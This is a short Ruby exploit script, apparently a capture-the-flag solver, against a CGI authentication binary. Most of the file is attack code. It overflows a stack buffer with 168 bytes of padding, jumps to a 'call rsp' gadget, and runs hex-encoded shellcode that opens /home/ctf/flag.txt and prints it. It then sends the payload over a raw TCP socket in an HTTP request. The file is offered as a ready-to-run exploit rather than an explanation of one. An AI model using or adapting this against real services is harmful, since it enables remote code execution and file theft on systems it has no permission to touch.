# Encoding: ascii-8bit

require './libronsolve'
require 'base64'
require 'httparty'

# The address 0x4127CA is `call rsp`
CALL_RSP="\xca\x27\x41\x00\x00\x00\x00\x00".force_encoding('ascii-8bit')

# Super inefficient "read file / write stdout" shellcode
SHELLCODE = ["b802000000e8130000002f686f6d652f6374662f666c61672e747874005fbe00000000ba000000000f055750b8000000005f5eba240000000f05b801000000bf01000000ba240000000f05b83c000000bf000000000f05"].pack('H*')

# We need 
PADDING = 168
EXPLOIT = ("A" * PADDING) + CALL_RSP + SHELLCODE

HOST, PORT = get_host_port()
puts "Connecting to #{HOST}:#{PORT}..."
s = TCPSocket.new(HOST, PORT)
s.write(
  "GET /cgi-bin/auth.cgi HTTP/1.0\r\n" +
  "Content-Length: #{EXPLOIT.length}\r\n" +
  "\r\n" +
  "#{EXPLOIT + SHELLCODE}"
)

response = s.read.split(/\n/).pop
check_flag(response, terminate: true)
